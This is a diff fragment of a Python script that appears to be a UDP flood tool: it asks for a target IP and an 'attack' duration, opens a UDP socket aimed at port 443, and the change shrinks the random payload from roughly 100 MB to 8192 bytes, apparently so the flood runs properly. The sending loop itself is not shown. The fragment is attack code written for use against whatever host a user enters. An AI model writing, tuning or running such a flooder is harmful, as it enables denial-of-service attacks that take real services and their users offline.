@@ -8,7 +8,7 @@ os.system("cls")
 port = 443
 ip = input("\nEnter IP: ")
 dur = int(input("\nEnter duration of attack: "))
-bytes = os.urandom(104857600)
+bytes = os.urandom(8192)
 socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sent = int(0)
 timeout = time.time()+dur
